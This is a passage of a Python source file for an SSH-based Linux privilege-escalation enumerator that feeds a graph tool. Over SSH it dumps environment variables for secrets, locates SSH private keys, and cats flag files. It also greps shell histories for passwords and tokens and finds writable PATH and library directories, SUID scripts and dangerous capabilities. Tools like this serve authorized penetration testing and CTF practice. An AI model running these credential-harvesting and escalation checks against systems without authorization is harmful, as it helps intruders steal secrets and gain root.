        cu    = self._current_user
        cu_id = f"user:{cu}"
        home_dir = self.run("echo $HOME").strip()

        env_vars = self.run("env 2>/dev/null")
        for line in env_vars.splitlines():
            lower = line.lower()
            if "=" in line and any(s in lower for s in SENSITIVE_ENV_KEYS):
                self._add_finding("CRITICAL", "env", f"Sensitive env variable: {line[:120]}", line)

        interesting_home = self.run_lines(
            f"find {home_dir} -maxdepth 4 -type f \\("
            " -name '*.txt' -o -name '*.log' -o -name '*.cfg' -o -name '*.conf'"
            " -o -name '*.env' -o -name '*.bak' -o -name '*.old'"
            " -o -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519'"
            " -o -name '*.pem' -o -name '*.key' -o -name '*.ppk'"
            " -o -name 'flag*' -o -name 'user.txt' -o -name 'root.txt'"
            " \\) 2>/dev/null | head -40"
        )
        for f in interesting_home:
            fname = os.path.basename(f).lower()
            if any(x in fname for x in ("id_rsa","id_dsa","id_ecdsa","id_ed25519",".pem",".key",".ppk")):
                perms = self.run(f"stat -c '%a' '{f}' 2>/dev/null")
                self._add_finding("CRITICAL", "env", f"SSH/crypto key: {f}  (perms: {perms})", f)
            elif fname in ("user.txt","root.txt","flag.txt"):
                content = self.run(f"cat '{f}' 2>/dev/null")
                self._add_finding("CRITICAL", "env", f"CTF flag file: {f}", content[:80] if content else f)
            elif any(x in fname for x in (".env","passwd","password","secret","cred")):
                self._add_finding("HIGH", "env", f"Potentially sensitive file: {f}", f)
            elif self.verbose:
                log_verbose("env", "file", f)

        for hf in self.run_lines(
            f"find {home_dir} /root -maxdepth 2"
            " \\( -name '*_history' -o -name '.bash_history' -o -name '.zsh_history' \\) 2>/dev/null"
        ):
            if not self.readable(hf):
                continue
            hist = self.run(
                f"cat '{hf}' 2>/dev/null | grep -iE"
                " '(pass|passwd|password|secret|key|token|curl|wget|ssh|mysql|psql|ftp)' | head -20"
            )
            if hist:
                self._add_finding("HIGH", "env", f"Sensitive commands in history: {hf}", hist[:200])

        for f in self.run_lines(
            "find /opt /srv /var/www -maxdepth 4 -type f \\("
            " -name '*.env' -o -name '*.conf' -o -name '*.cfg' -o -name 'config.*'"
            " -o -name '*.db' -o -name '*.sqlite' -o -name '*.sql'"
            " -o -name '*.bak' -o -name '*.backup'"
            " \\) 2>/dev/null | head -30"
        ):
            fname = os.path.basename(f).lower()
            if any(x in fname for x in (".env","password","secret","cred",".db",".sqlite",".sql")):
                self._add_finding("HIGH", "env", f"Interesting file in web/opt: {f}", f)
            elif self.verbose:
                log_verbose("env", "opt/www", f)

        log_ok(f"Env collected  |  Interesting files: {len(interesting_home)}")

    def collect_sacspengu(self):
        log_info("Running SACSPengu module - compiler and binary analysis...")
        cu_id = f"user:{self._current_user}"

        compilers = [
            "gcc","g++","cc","c89","c99","make","cmake","ninja",
            "python","python3","python2","perl","ruby","php",
            "java","javac","go","cargo","rustc",
            "as","ld","ar","nm","objdump","strip","readelf",
        ]
        found = 0
        for comp in compilers:
            path = self.run(f"which {comp} 2>/dev/null")
            if not path:
                continue
            found += 1
            nid = f"binary:{path.strip()}"
            self._add_node(nid, "binary", path.strip(), {
                "path": path.strip(), "suid": False, "gtfobin": False, "owner": "root",
            })
            self._add_finding("POTENTIAL", "sacspengu", f"Compiler/interpreter: {comp} -> {path.strip()}", path)
            if comp in ("gcc","g++","cc","make","as"):
                self._add_edge(cu_id, "SuidBinary", nid, risk="medium",
                               properties={"path": path.strip(), "note": "compiler available"})

        ld_path = self.run("echo $LD_LIBRARY_PATH")
        if ld_path:
            for ldir in ld_path.split(":"):
                if ldir.strip() and self.writable(ldir.strip()):
                    self._add_finding("CRITICAL", "sacspengu", f"Writable LD_LIBRARY_PATH dir: {ldir}", ldir)

        for ldir in ("/usr/local/lib","/usr/lib","/lib","/opt/lib"):
            if self.writable(ldir):
                self._add_finding("CRITICAL", "sacspengu", f"Writable library directory: {ldir}", ldir)

        writable_path = 0
        for pdir in self.run("echo $PATH").split(":"):
            if pdir.strip() and self.writable(pdir.strip()):
                writable_path += 1
                self._add_finding("CRITICAL", "sacspengu", f"Writable $PATH directory: {pdir}", pdir)

        for bf in self.run_lines(
            "find /opt /srv /home /var/www /usr/local/src /tmp -maxdepth 4"
            " \\( -name 'Makefile' -o -name 'CMakeLists.txt'"
            " -o -name 'setup.py' -o -name 'Cargo.toml' \\)"
            " 2>/dev/null | head -20"
        ):
            bdir = os.path.dirname(bf)
            if self.writable(bdir):
                self._add_finding("HIGH", "sacspengu", f"Writable build directory: {bdir}  ({os.path.basename(bf)})", bdir)
            elif self.verbose:
                log_verbose("sacspengu", "build file", bf)

        for s in self.run_lines(
            "find / -perm -4000 \\( -name '*.py' -o -name '*.pl'"
            " -o -name '*.rb' -o -name '*.sh' \\) 2>/dev/null"
        ):
            nid = f"binary:{s}"
            self._add_node(nid, "binary", s, {
                "path": s, "suid": True, "gtfobin": True, "owner": "root",
            })
            self._add_finding("CRITICAL", "sacspengu", f"SUID interpreted script: {s}", s)
            self._add_edge(cu_id, "SuidBinary", nid, risk="critical",
                           properties={"path": s, "note": "SUID interpreted script"})
            self._add_edge(cu_id, "SuidBinary", "user:root", risk="critical",
                           properties={"via": f"SUID script {os.path.basename(s)}"})

        caps = self.run("getcap -r / 2>/dev/null | head -20")
        if caps:
            dangerous = ("cap_setuid","cap_setgid","cap_sys_admin","cap_net_admin","cap_dac_override","cap_fowner")
            for line in caps.splitlines():
                if not line.strip():
                    continue
                cap_path = line.split()[0] if line.split() else ""
                if any(cap in line for cap in dangerous):
                    cap_name = os.path.basename(cap_path)
                    nid      = f"binary:{cap_path}"
                    self._add_node(nid, "binary", cap_name, {
                        "path": cap_path, "suid": False, "gtfobin": True, "owner": "root",
                    })
                    self._add_finding("CRITICAL", "sacspengu", f"Dangerous capability: {line.strip()}", line)
                    self._add_edge(cu_id, "SuidBinary", nid, risk="critical",
                                   properties={"capability": line.strip()})
                    self._add_edge(cu_id, "SuidBinary", "user:root", risk="critical",
                                   properties={"via": f"capability {cap_name}"})
                elif self.verbose:
                    log_verbose("sacspengu", "capability", line.strip())

        log_ok(f"Compilers: {found}  |  Writable PATH dirs: {writable_path}  |  Capabilities scanned")

    def run_all(self):
        self.collect_users()
        self.collect_sudo()
        self.collect_suid()
        self.collect_groups()
        self.collect_services()
        self.collect_cron()
        self.collect_kernel()
        self.collect_containers()
        self.collect_network()
        self.collect_env()
        self.collect_sacspengu()

    def run_module(self, module):
        modules = {"sacspengu": self.collect_sacspengu}
        if module not in modules:
            log_err(f"Unknown module: {module}  |  Available: sacspengu")
            sys.exit(1)
        self.collect_users()
        self.collect_groups()
        modules[module]()


def connect_ssh(target, port, username, password, key_file):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        if key_file:
            key_file = os.path.expanduser(key_file)
            if not os.path.exists(key_file):
                log_err(f"Key file not found: {key_file}")
                sys.exit(1)
            pkey = None
            for key_class in (paramiko.RSAKey, paramiko.Ed25519Key, paramiko.ECDSAKey, paramiko.DSSKey):
                try:
                    pkey = key_class.from_private_key_file(key_file)
                    break
                except Exception:
                    continue
            if pkey is None:
                log_err(f"Could not load key: {key_file} - unsupported format")
                sys.exit(1)
            client.connect(hostname=target, port=port, username=username, pkey=pkey,
                           timeout=15, allow_agent=False, look_for_keys=False)
        else:
            client.connect(hostname=target, port=port, username=username, password=password,
                           timeout=15, allow_agent=False, look_for_keys=False)
        return client
    except paramiko.AuthenticationException:
        log_err(f"Authentication failed - {username}@{target}:{port}")
        sys.exit(1)
    except paramiko.ssh_exception.NoValidConnectionsError:
        log_err(f"Cannot connect to {target}:{port} - host down or port closed")
        sys.exit(1)
    except socket.timeout:
        log_err(f"Connection timed out: {target}:{port}")
        sys.exit(1)
    except socket.gaierror:
        log_err(f"Cannot resolve host: {target}")
        sys.exit(1)
    except Exception as e:
        log_err(f"SSH error: {e}")
        sys.exit(1)


def parse_args():
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("target",     nargs="?",  default=None)
    parser.add_argument("-u",         dest="username", default=None)
    parser.add_argument("-p",         dest="password", default=None)
    parser.add_argument("-k",         dest="key_file", default=None)
    parser.add_argument("-d",         dest="domain",   default=None)
    parser.add_argument("--port",     dest="port",     type=int, default=22)
    parser.add_argument("-M",         dest="module",   default=None)
    parser.add_argument("-o",         dest="output",   default="pypengu-output.json")
    parser.add_argument("-v",         dest="verbose",  action="store_true", default=False)
    parser.add_argument("--no-color", dest="no_color", action="store_true", default=False)
    parser.add_argument("-h","--help",dest="help",     action="store_true", default=False)
    return parser.parse_args()


def main():
    global NO_COLOR
    args = parse_args()

    if args.no_color:
        NO_COLOR = True

    if args.help or args.target is None:
        print_help()
        sys.exit(0)

    if not args.username:
        banner()
        log_err("Username required: -u <username>")
        sys.exit(1)

    if not args.password and not args.key_file:
        banner()
        log_err("Authentication required: -p <password>  or  -k <key_file>")
        sys.exit(1)

    if args.module and args.module not in ("sacspengu",):
        banner()
        log_err(f"Unknown module: {args.module}  |  Available: sacspengu")
        sys.exit(1)

    banner()
    divider()

    auth_label = f"key:{args.key_file}" if args.key_file else "password"
    log_info(f"Target  : {c(WHITE, args.target)}:{c(WHITE, str(args.port))}")
    log_info(f"User    : {c(WHITE, args.username)}")
    log_info(f"Auth    : {c(WHITE, auth_label)}")
    if args.domain:
        log_info(f"Domain  : {c(WHITE, args.domain)}")
    log_info(f"Mode    : {c(BORANGE, args.module) if args.module else c(WHITE, 'full collection')}")
    log_info(f"Output  : {c(WHITE, args.output)}")
    print()

    log_info(f"Connecting to {args.target}:{args.port}...")
    t0     = time.time()
    client = connect_ssh(args.target, args.port, args.username, args.password, args.key_file)
    log_ok(f"Connected in {time.time()-t0:.2f}s  -  {args.username}@{args.target}:{args.port}")

    uname = client.exec_command("uname -a 2>/dev/null")[1].read().decode("utf-8", errors="replace").strip()
    log_ok(f"Remote  : {c(DGREY, uname)}")
    print()
    divider()

    collector = SSHCollector(client, args.target, args.domain, args.verbose)
    t_start   = time.time()

    if args.module:
        collector.run_module(args.module)
    else:
        collector.run_all()

    client.close()

    elapsed  = time.time() - t_start
    output   = collector.build_output()
    findings = collector._findings
    edges    = output["edges"]
    nodes    = output["nodes"]
    critical = sum(1 for f in findings if f["tier"] == "CRITICAL")
    high     = sum(1 for f in findings if f["tier"] == "HIGH")
    potential= sum(1 for f in findings if f["tier"] == "POTENTIAL")

    out_dir = os.path.dirname(args.output)
    if out_dir:
        os.makedirs(out_dir, exist_ok=True)
    with open(args.output, "w") as fh:
        json.dump(output, fh, indent=2)

    print()
    divider()
    log_ok(f"Collection complete in {elapsed:.2f}s")
    print()
    print(f"  {c(BRED,    '[CRITICAL ]')}  {c(WHITE, str(critical))}")
    print(f"  {c(BORANGE, '[HIGH     ]')}  {c(WHITE, str(high))}")
    print(f"  {c(ORANGE,  '[POTENTIAL]')}  {c(WHITE, str(potential))}")
    print()
    print(f"  {c(BORANGE, '[~]')}  {c(DGREY, 'Total findings  :')}  {c(WHITE, str(len(findings)))}")
    print(f"  {c(BORANGE, '[~]')}  {c(DGREY, 'Graph nodes     :')}  {c(WHITE, str(len(nodes)))}")
    print(f"  {c(BORANGE, '[~]')}  {c(DGREY, 'Graph edges     :')}  {c(WHITE, str(len(edges)))}")
    print(f"  {c(BORANGE, '[~]')}  {c(DGREY, 'Output file     :')}  {c(WHITE, args.output)}")
    print()
    log_ok(f"Import {c(WHITE, args.output)} into BloodPengu via Import JSON")
    print()
    divider()
    print(f"  {c(DGREY, f'gxc-BloodPengu.py v{BP_VERSION} by <@byt3n33dl3> <github.com/byt3n33dl3/gxc-BloodPengu.py>')}")
    print()


if __name__ == "__main__":
    main()
